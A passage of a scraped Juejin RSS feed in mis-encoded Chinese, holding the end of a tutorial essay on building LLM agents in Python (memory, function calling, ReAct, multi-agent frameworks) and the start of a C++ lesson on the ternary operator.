 Â  Â  Â   if thought.need_tool:
 Â  Â  Â  Â  Â   <span class="hljs-attr">result</span> = execute_tool(thought.tool_name, thought.args)
 Â  Â  Â  Â  Â   context.append(result)
 Â  Â  Â  Â 
 Â  Â  Â   <span class="hljs-comment"># 3. è§‚å¯Ÿä¸åˆ¤æ–­</span>
 Â  Â  Â   if is_goal_reached(context):
 Â  Â  Â  Â  Â   return final_answer
</code></pre>
<h3 data-id="heading-3">1.2 ä¸ªäººç†è§£ï¼šä»â€œä¸²è¡Œâ€åˆ°â€œè‡ªé€‚åº”è¿­ä»£â€</h3>
<p>ä¼ ç»Ÿçš„ç¨‹åºæ˜¯ç¡¬ç¼–ç çš„ <code>if-else</code>ã€‚è€Œ Agent çš„å·¥ç¨‹æœ¬è´¨æ˜¯å°†<strong>å†³ç­–æƒäº¤ç»™äº† LLM</strong>ã€‚æˆ‘ä»¬çš„ä»»åŠ¡ä¸å†æ˜¯å†™æ­»é€»è¾‘ï¼Œè€Œæ˜¯æ„å»ºä¸€ä¸ª<strong>è¶³å¤Ÿé²æ£’çš„è¿è¡Œç¯å¢ƒï¼ˆRuntimeï¼‰</strong> ï¼Œè®© LLM åœ¨å…¶ä¸­å®‰å…¨ã€é«˜æ•ˆåœ°è¿è¡Œ Python å‡½æ•°ã€‚</p>
<h2 data-id="heading-4">ç¬¬äºŒç« ï¼šè®°å¿†ç³»ç»Ÿçš„æ·±åº¦å®ç°ï¼šå†…å­˜ä¸å‘é‡æ•°æ®åº“</h2>
<p>Agent è‹¥æƒ³å®Œæˆå¤æ‚ä»»åŠ¡ï¼Œå¿…é¡»è§£å†³â€œé—å¿˜â€é—®é¢˜ã€‚åœ¨ Python å¼€å‘ä¸­ï¼Œè¿™æ¶‰åŠåˆ°<strong>ä¸Šä¸‹æ–‡çª—å£ç®¡ç†</strong>ä¸<strong>æŒä¹…åŒ–æ£€ç´¢</strong>ã€‚</p>
<h3 data-id="heading-5">2.1 çŸ­æœŸè®°å¿†ï¼šWindow Buffer ä¸ Summarization</h3>
<p>ç”±äºæ¨¡å‹ Token é™åˆ¶ï¼Œæˆ‘ä»¬ä¸èƒ½æŠŠæ‰€æœ‰å†å²å¯¹è¯å¡è¿›å»ã€‚</p>
<ul>
<li><strong>Buffer æ¨¡å¼ï¼š</strong> ä»…ä¿ç•™æœ€è¿‘çš„ N è½®å¯¹è¯ã€‚</li>
<li><strong>Summary æ¨¡å¼ï¼š</strong> ç¼–å†™ä¸€ä¸ª Python è„šæœ¬ï¼Œå®šæœŸè®© LLM å¯¹æ—§å¯¹è¯è¿›è¡Œæ€»ç»“ï¼Œåªä¿ç•™è¦ç‚¹ã€‚</li>
</ul>
<h3 data-id="heading-6">2.2 é•¿æœŸè®°å¿†ï¼šåŸºäº RAG çš„å‘é‡æ£€ç´¢</h3>
<p>åœ¨ Python ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>LangChain</code> æˆ– <code>LlamaIndex</code> é…åˆ <code>ChromaDB</code> æˆ– <code>FAISS</code>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å…¸å‹çš„é•¿æœŸè®°å¿†æ£€ç´¢é€»è¾‘</span>
from langchain_community.vectorstores import Chroma
â€‹
def get_long_term_memory(query):
 Â   <span class="hljs-attr">db</span> = Chroma(persist_directory=<span class="hljs-string">"./agent_memory"</span>, embedding_function=ef)
 Â   <span class="hljs-comment"># ç›¸ä¼¼åº¦æœç´¢</span>
 Â   <span class="hljs-attr">docs</span> = db.similarity_search(query, k=<span class="hljs-number">3</span>)
 Â   return <span class="hljs-section">[doc.page_content for doc in docs]</span>
</code></pre>
<p><strong>ç†è§£ï¼š</strong> è®°å¿†ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯ç»™ Agent æŒ‚è½½äº†ä¸€ä¸ªâ€œå¤–éƒ¨ç¡¬ç›˜â€ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œéš¾ç‚¹ä¸åœ¨äºæ•°æ®åº“çš„å­˜å‚¨ï¼Œè€Œåœ¨äº <strong>Embedding çš„è´¨é‡</strong> å’Œ <strong>Top-K æ£€ç´¢çš„ç²¾å‡†åº¦</strong>ã€‚</p>
<h2 data-id="heading-7">ç¬¬ä¸‰ç« ï¼šå·¥å…·ä½¿ç”¨ï¼ˆTool Useï¼‰ï¼šå‡½æ•°è°ƒç”¨çš„è‰ºæœ¯</h2>
<p>è¿™æ˜¯ Agent è·å¾—â€œåŒæ‰‹â€çš„è¿‡ç¨‹ã€‚OpenAI å¼•å…¥çš„ <code>function_calling</code> æ”¹å˜äº†æ¸¸æˆè§„åˆ™ã€‚</p>
<h3 data-id="heading-8">3.1 æ€ä¹ˆè®©æ¨¡å‹ç†è§£ Python å‡½æ•°ï¼Ÿ</h3>
<p>æˆ‘ä»¬é€šè¿‡ JSON Schema æ¥æè¿°å‡½æ•°ã€‚Agent å¹¶ä¸è¿è¡Œæ¨¡å‹ç”Ÿæˆçš„â€œæ–‡å­—â€ï¼Œè€Œæ˜¯è§£ææ¨¡å‹ç”Ÿæˆçš„â€œè°ƒç”¨å‚æ•°â€ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å®šä¹‰å·¥å…·</span>
<span class="hljs-attr">tools</span> = [
 Â   {
 Â  Â  Â   <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span>,
 Â  Â  Â   <span class="hljs-string">"function"</span>: {
 Â  Â  Â  Â  Â   <span class="hljs-string">"name"</span>: <span class="hljs-string">"get_stock_price"</span>,
 Â  Â  Â  Â  Â   <span class="hljs-string">"description"</span>: <span class="hljs-string">"è·å–å®æ—¶è‚¡ç¥¨ä»·æ ¼"</span>,
 Â  Â  Â  Â  Â   <span class="hljs-string">"parameters"</span>: {
 Â  Â  Â  Â  Â  Â  Â   <span class="hljs-string">"type"</span>: <span class="hljs-string">"object"</span>,
 Â  Â  Â  Â  Â  Â  Â   <span class="hljs-string">"properties"</span>: {
 Â  Â  Â  Â  Â  Â  Â  Â  Â   <span class="hljs-string">"symbol"</span>: {<span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span>, <span class="hljs-string">"description"</span>: <span class="hljs-string">"è‚¡ç¥¨ä»£ç "</span>}
 Â  Â  Â  Â  Â  Â  Â   }
 Â  Â  Â  Â  Â   }
 Â  Â  Â   }
 Â   }
]
</code></pre>
<h3 data-id="heading-9">3.2 ä¸ªäººç†è§£ï¼šä»£ç å³æè¿°ï¼ˆDocstring is all you needï¼‰</h3>
<p>åœ¨æ„å»º Agent æ—¶ï¼Œ<strong>å‡½æ•°çš„ Docstring æˆäº†æœ€é‡è¦çš„â€œä»£ç â€</strong> ã€‚å¦‚æœä½ çš„å‡½æ•°æ³¨é‡Šå†™å¾—ä¸æ¸…æ™°ï¼ŒAgent å°±ä¼šè°ƒé”™å‚æ•°ã€‚è¿™è¿«ä½¿æˆ‘ä»¬å›å½’åˆ°æœ€çº¯ç²¹çš„ç¼–ç¨‹ä¹ æƒ¯ï¼šæ¸…æ™°çš„å‘½åã€è§„èŒƒçš„ç±»å‹æ³¨è§£ä»¥åŠè¯¦å°½çš„æ–‡æ¡£è¯´æ˜ã€‚</p>
<h2 data-id="heading-10">ç¬¬å››ç« ï¼šè§„åˆ’ä¸åæ€ï¼šä» CoT åˆ° ReAct èŒƒå¼</h2>
<h3 data-id="heading-11">4.1 æ€ç»´é“¾ï¼ˆChain of Thoughtï¼‰</h3>
<p>Agent éœ€è¦åœ¨æ‰§è¡Œå‰è¿›è¡Œé€»è¾‘æ‹†è§£ã€‚åœ¨ Python ä¸­ï¼Œè¿™é€šå¸¸è¡¨ç°ä¸ºå¤šçº§ Promptã€‚</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">âˆ£</mi><mi>G</mi><mi>o</mi><mi>a</mi><mi>l</mi><mo stretchy="false">)</mo><mo>=</mo><mo>âˆ‘</mo><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">âˆ£</mi><mi>S</mi><mi>t</mi><mi>e</mi><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>â‹…</mo><mi>P</mi><mo stretchy="false">(</mo><mi>S</mi><mi>t</mi><mi>e</mi><msub><mi>p</mi><mi>i</mi></msub><mi mathvariant="normal">âˆ£</mi><mi>G</mi><mi>o</mi><mi>a</mi><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(Action | Goal) = \sum P(Action | Step_i) \cdot P(Step_i | Goal)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">âˆ£</span><span class="mord mathnormal">G</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">âˆ£</span><span class="mord mathnormal">St</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">St</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">âˆ£</span><span class="mord mathnormal">G</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span></span></p>
<h3 data-id="heading-12">4.2 ReAct æ¨¡å¼çš„ Python å®è·µ</h3>
<p>ReAct æ˜¯ç›®å‰æœ€ç¨³å¥çš„æ¨¡å¼ï¼š</p>
<ol start="0">
<li><strong>Thought:</strong> æ¨¡å‹åˆ†æç°çŠ¶ã€‚</li>
<li><strong>Action:</strong> æ¨¡å‹é€‰æ‹©å·¥å…·ã€‚</li>
<li><strong>Observation:</strong> Python æ‰§è¡Œå·¥å…·å¹¶è¿”å›ç»“æœç»™æ¨¡å‹ã€‚</li>
</ol>
<p><strong>æŠ€æœ¯éš¾ç‚¹ï¼š</strong> å¾ªç¯æ­»ç»“ã€‚å½“æ¨¡å‹åå¤å°è¯•é”™è¯¯çš„å·¥å…·æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ Python é€»è¾‘ä¸­åŠ å…¥â€œç†”æ–­æœºåˆ¶ï¼ˆMax Iterationsï¼‰â€ï¼Œé˜²æ­¢è´¹ç”¨è¶…æ”¯ã€‚</p>
<h2 data-id="heading-13">ç¬¬äº”ç« ï¼šå¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-Agentï¼‰ï¼šç¾¤ä½“æ™ºèƒ½çš„å·¥ç¨‹åŒ–</h2>
<p>å• Agent å¤„ç†é•¿é“¾è·¯ä»»åŠ¡æ—¶ææ˜“â€œè¿·å¤±â€ã€‚è§£å†³æ–¹æ³•æ˜¯ï¼š<strong>åˆ†è€Œæ²»ä¹‹</strong>ã€‚</p>
<h3 data-id="heading-14">5.1 æ¡†æ¶é€‰æ‹©ï¼šAutogen vs CrewAI</h3>
<ul>
<li><strong>Autogen:</strong> å¼ºè°ƒ Agent ä¹‹é—´çš„å¯¹è¯ï¼ˆConversationï¼‰ã€‚</li>
<li><strong>CrewAI:</strong> å¼ºè°ƒè§’è‰²åˆ†é…ï¼ˆRole-basedï¼‰å’Œæµç¨‹ç®¡ç†ï¼ˆProcessï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-15">5.2 æ·±åº¦æ€è€ƒï¼šåä½œä¸­çš„é€šä¿¡åè®®</h3>
<p>åœ¨å¤š Agent ç³»ç»Ÿä¸­ï¼ŒPython ä»£ç æ‰®æ¼”çš„æ˜¯â€œå¯¼æ¼”â€è§’è‰²ã€‚æ¯ä¸ª Agent éƒ½æœ‰è‡ªå·±çš„æŒ‡ä»¤ï¼ˆSystem Messageï¼‰ã€‚</p>
<ul>
<li><strong>ç†è§£ï¼š</strong> å¤šæ™ºèƒ½ä½“åä½œä¸æ˜¯æ¨¡å‹æ›´å¼ºäº†ï¼Œè€Œæ˜¯<strong>å·¥ç¨‹çº¦æŸæ›´ä¸¥å¯†äº†</strong>ã€‚é€šè¿‡é™å®šæ¯ä¸ª Agent çš„è¾¹ç•Œï¼Œé™ä½äº†å•ä¸ª Agent å‡ºé”™çš„æ¦‚ç‡ã€‚</li>
</ul>
<h2 data-id="heading-16">ç¬¬å…­ç« ï¼šä¸ªäººå®æˆ˜å¿ƒå¾—ï¼šæ„å»º Agent çš„é¿å‘æŒ‡å—</h2>
<p>åœ¨å¼€å‘è¿‡æ•°ä¸ªå‚ç›´é¢†åŸŸçš„ Agent åï¼Œæˆ‘æœ‰å‡ ç‚¹æ·±åˆ»çš„ç†è§£ï¼š</p>
<ol start="0">
<li><strong>Prompt å¹¶éä¸‡èƒ½ï¼Œé€»è¾‘æ ¡éªŒæ‰æ˜¯ç‹é“ï¼š</strong> ä¸è¦æŒ‡æœ›æ¨¡å‹ç™¾åˆ†ä¹‹ç™¾è¾“å‡ºæ­£ç¡®çš„ JSONã€‚åœ¨ Python ç«¯ï¼Œå¿…é¡»ä½¿ç”¨ <code>Pydantic</code> è¿›è¡Œä¸¥æ ¼çš„æ ¼å¼æ ¡éªŒã€‚å¦‚æœè§£æå¤±è´¥ï¼Œåº”è‡ªåŠ¨å°†é”™è¯¯åé¦ˆç»™æ¨¡å‹è®©å…¶ä¿®æ­£ï¼Œè€Œä¸æ˜¯ç›´æ¥æŠ¥é”™é€€å‡ºã€‚</li>
<li><strong>ç¨³å®šæ€§å¤§äºèªæ˜åº¦ï¼š</strong> ä¸€ä¸ª 80 åˆ†èªæ˜ä½† 100% ç¨³å®šçš„ Agentï¼Œè¿œå¥½äºä¸€ä¸ª 100 åˆ†èªæ˜ä½†æ—¶å¸¸æ­»å¾ªç¯çš„ Agentã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¦å¤§é‡ä½¿ç”¨â€œç¡®å®šæ€§ä»£ç â€æ¥è¾…åŠ©â€œä¸ç¡®å®šæ€§æ¨¡å‹â€ã€‚</li>
<li><strong>çŠ¶æ€æœºï¼ˆState Machineï¼‰çš„å¿…è¦æ€§ï¼š</strong> å¯¹äºå¤æ‚çš„ Agentï¼Œå•çº¯çš„ Loop ä¸å¤Ÿç”¨ã€‚ä½¿ç”¨ <code>LangGraph</code> è¿™æ ·çš„æœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰æˆ–çŠ¶æ€æœºæ¥ç¼–æ’ä»»åŠ¡ï¼Œæ˜¯ç›®å‰æœ€é«˜çº§çš„åšæ³•ã€‚</li>
</ol>
<h2 data-id="heading-17">ç¬¬ä¸ƒç« ï¼šå±•æœ›ï¼šPython å¼€å‘è€…çš„ä¸‹åŠåœº</h2>
<p>â€œæ™ºèƒ½ä½“æ¥äº†â€å¹¶ä¸æ„å‘³ç€ç¨‹åºå‘˜ä¼šå¤±ä¸šï¼Œè€Œæ˜¯æ„å‘³ç€<strong>ç¼–ç¨‹èŒƒå¼çš„æ¼”è¿›</strong>ã€‚</p>
<p>è¿‡å»æˆ‘ä»¬ç¼–å†™ <strong>Deterministicï¼ˆç¡®å®šæ€§ï¼‰</strong> é€»è¾‘ï¼š<code>Input -&gt; Function -&gt; Output</code>ã€‚ æœªæ¥æˆ‘ä»¬å°†ç¼–å†™ <strong>Probabilisticï¼ˆæ¦‚ç‡æ€§ï¼‰</strong> é€»è¾‘ï¼š<code>Goal -&gt; Agent Environment -&gt; Verification -&gt; Output</code>ã€‚</p>
<p><strong>æ ¸å¿ƒç«äº‰åŠ›ï¼š</strong> æœªæ¥çš„ Python å¼€å‘è€…ä¸ä»…è¦æ‡‚ Web æ¡†æ¶ï¼ˆDjango/FastAPIï¼‰ï¼Œæ›´è¦æ‡‚å¦‚ä½•è®¾è®¡ <strong>Agent å‹å¥½çš„å·¥å…·æ¥å£</strong>ã€å¦‚ä½•ä¼˜åŒ– <strong>å‘é‡æ£€ç´¢çš„å¬å›ç‡</strong> ä»¥åŠå¦‚ä½•è°ƒè¯• <strong>æ¨¡å‹åœ¨å¤æ‚ä»»åŠ¡ä¸­çš„é€»è¾‘ç¼ºé™·</strong>ã€‚</p>
<h2 data-id="heading-18">ç»“è¯­ï¼šæ‹¥æŠ±ä¸ç¡®å®šæ€§</h2>
<p>æ™ºèƒ½ä½“æ˜¯ LLM çš„ç»ˆæå½¢æ€ï¼Œè€Œ Python æ˜¯æ‰¿è½½è¿™ä¸€å½¢æ€çš„æœ€ä½³åœŸå£¤ã€‚</p>
<p>åœ¨è¿™åœºå˜é©ä¸­ï¼Œæˆ‘ä»¬ä¸åº”åªåšä¸€ä¸ªè§‚æœ›è€…ï¼Œè€Œåº”äº²è‡ªåŠ¨æ‰‹å»å†™ä¸€ä¸ª Loopï¼Œå»æŒ‚è½½ä¸€ä¸ª Toolï¼Œå»è§‚å¯Ÿæ¨¡å‹åœ¨å¤„ç†é”™è¯¯æ—¶çš„çª˜è¿«ä¸æƒŠå–œã€‚åªæœ‰åœ¨ä»£ç çš„ä¸æ–­è°ƒè¯•ä¸­ï¼Œä½ æ‰èƒ½çœŸæ­£æ„ŸçŸ¥åˆ°ï¼š<strong>æ™ºèƒ½ä½“ï¼ŒçœŸçš„æ¥äº†ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¿¡å¥¥å´”è€å¸ˆï¼šä¸‰ç›®è¿ç®— (Ternary Operator)]]></title>    <link>https://juejin.cn/post/7594389937462558730</link>    <guid>https://juejin.cn/post/7594389937462558730</guid>    <pubDate>2026-01-13T01:54:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937462558730" data-draft-id="7594391758426865674" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¿¡å¥¥å´”è€å¸ˆï¼šä¸‰ç›®è¿ç®— (Ternary Operator)"/> <meta itemprop="keywords" content="C++,æ•°æ®ç»“æ„,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-13T01:54:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jikiecui"/> <meta itemprop="url" content="https://juejin.cn/user/871232992194781"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¿¡å¥¥å´”è€å¸ˆï¼šä¸‰ç›®è¿ç®— (Ternary Operator)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/871232992194781/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jikiecui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:54:26.000Z" title="Tue Jan 13 2026 01:54:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">4.5 [ç­‰çº§1] ä¸‰ç›®è¿ç®— (Ternary Operator)</h2>
<h3 data-id="heading-1">1. æ¦‚å¿µä»‹ç»</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e452473593248909dfa12808ff2677c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamlraWVjdWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874066&amp;x-signature=0PSHZA5FcfqpjwYL92DXF8MZwlo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸‰ç›®è¿ç®—ç¬¦ï¼Œä¹Ÿå«æ¡ä»¶è¿ç®—ç¬¦ï¼Œæ˜¯ C++ ä¸­å”¯ä¸€ä¸€ä¸ªéœ€è¦ä¸‰ä¸ªæ“ä½œæ•°çš„è¿ç®—ç¬¦ã€‚å®ƒæ˜¯ä¸€ç§ç´§å‡‘çš„Â <code>if-else</code>Â è¯­å¥çš„æ›¿ä»£å½¢å¼ï¼Œç”¨äºæ ¹æ®ä¸€ä¸ªæ¡ä»¶é€‰æ‹©ä¸¤ä¸ªå€¼ä¸­çš„ä¸€ä¸ªã€‚ è¯­æ³•æ ¼å¼ä¸ºï¼š<code>condition ? expression_if_true : expression_if_false</code></p>
<ul>
<li><code>condition</code>: ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ã€‚</li>
<li><code>expression_if_true</code>: å¦‚æœÂ <code>condition</code>Â ä¸ºÂ <code>true</code>ï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„å€¼å°±æ˜¯è¿™ä¸ªéƒ¨åˆ†çš„å€¼ã€‚</li>
<li><code>expression_if_false</code>: å¦‚æœÂ <code>condition</code>Â ä¸ºÂ <code>false</code>ï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„å€¼å°±æ˜¯è¿™ä¸ªéƒ¨åˆ†çš„å€¼ã€‚</li>
</ul>
<h3 data-id="heading-2">2. ç®—æ³•æ­¥éª¤</h3>
<ol>
<li>è®¡ç®—Â <code>condition</code>Â è¡¨è¾¾å¼ã€‚</li>
<li>å¦‚æœÂ <code>condition</code>Â çš„ç»“æœä¸ºÂ <code>true</code>ï¼ˆæˆ–éé›¶ï¼‰ï¼Œåˆ™è®¡ç®—Â <code>expression_if_true</code>ï¼Œå¹¶å°†å…¶ç»“æœä½œä¸ºæ•´ä¸ªä¸‰ç›®è¿ç®—è¡¨è¾¾å¼çš„ç»“æœã€‚</li>
